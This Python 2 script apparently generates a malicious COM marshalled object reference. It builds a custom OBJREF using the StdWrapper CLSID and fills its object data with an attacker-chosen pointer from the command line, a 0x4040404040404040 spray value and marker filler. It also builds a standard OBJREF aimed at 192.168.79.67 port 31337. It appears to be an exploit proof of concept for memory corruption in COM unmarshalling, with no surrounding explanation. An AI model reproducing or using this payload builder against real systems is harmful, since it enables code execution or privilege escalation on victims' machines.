import struct
import sys

def convertToArraySingleByte(string):
    res = '"Length": %d,'%len(string)
    res += '"Values": ['
    for c in string:
        res += '%d, '%ord(c)
    res = res[:-2]+']'
    return res

def Objref(objType, iid):
    signature = 'MEOW'
    if objType == 'Standard':
        flags = 0x1
    elif objType == 'Handler':
        flags = 0x2
    elif objType == 'Custom':
        flags = 0x4
    elif objType == 'Extended':
        flags = 0x8

    return signature+struct.pack('<I', flags)+iid

def StdObjref(cPublicRefs, oxid, oid, ipid):
    flags = 0x1000

    return struct.pack('<I', flags)+struct.pack('<I', cPublicRefs)+struct.pack('<Q', oxid)+struct.pack('<Q', oid)+ipid

SecurityProviderConstant = {
    'NONE': 0x0,
    'GSS_NEGOTIATE' : 0x9,
    'WINNT': 0x0a,
    'GSS_SCHANNEL': 0x0e,
    'GSS_KERBEROS': 0x10,
    'NETLOGON': 0x44
}

ProtocolSequenceIdentifier = {
    'DNET_NSP'  : 0x4,
    'IP_TCP'    : 0x7,
    'IP_UDP'    : 0x8,
    'SPX'       : 0xC,
    'NB_IPX'    : 0xD,
    'IPX'       : 0xE,
    'NB_NB'     : 0x12,
    'HTTP'      : 0x1f
}

def DualStringArray(stringBinding, secBinding):
    wNumEntries = struct.pack('<H', len(stringBinding+secBinding)+4)
    wSecurityOffset = struct.pack('<H', len(stringBinding)+2)
    return wNumEntries+wSecurityOffset+stringBinding+'\x00\x00'+secBinding+'\x00\x00'

def StringBinding(protocol, aNetworkAddr):
    wTowerId = struct.pack('<H', ProtocolSequenceIdentifier[protocol])
    return wTowerId+aNetworkAddr.encode('utf-16')[2:]

def SecBinding(security, spn):
    wAuthnSvc = struct.pack('<H', SecurityProviderConstant[security])
    if security != 'NONE':
        return wAuthnSvc+'\xff\xff'+spn.encode('utf-16')[2:]+'\x00\x00'
    else:
        return wAuthnSvc

def Objref_Standard():
    std = StdObjref(1, 0x12345678, 0x90abcdef, 'YOLOSWAGAAAAZZZZ')
    saResAddr = DualStringArray(StringBinding('IP_TCP', '192.168.79.67[31337]'), SecBinding('NETLOGON', 'test'))
    return std+saResAddr

def Objref_Custom(clsid, pObjectData):
    clsid = clsid[1:-1].replace('-', '').decode('hex')
    clsid_bytes = clsid[0:4][::-1]+clsid[4:6][::-1]+clsid[6:8][::-1]+clsid[8:]
    cbExtension = "\x00"*4
    reserved = "\x00"*4
    return clsid_bytes+cbExtension+reserved+pObjectData

iid='\x00'*8+'\xc0\x00\x00\x00\x00\x00\x00\x46'

O = Objref('Custom', iid)

print hex(int(sys.argv[1], 16))

O += Objref_Custom('{00000336-0000-0000-C000-000000000046}', 'VYSN'+iid+'YOLOaaaaaaaabbbbbbbb'+struct.pack('<Q', int(sys.argv[1], 16))+struct.pack('<Q', 0)+'eeeeeeeeffffffff'+struct.pack('<Q', 0x4040404040404040))

if len(sys.argv) == 2:
    print convertToArraySingleByte(O)
else:
    f = open('MarshalCOM_CLSID_StdWrapper', 'w')
    f.write(O)
    f.close()
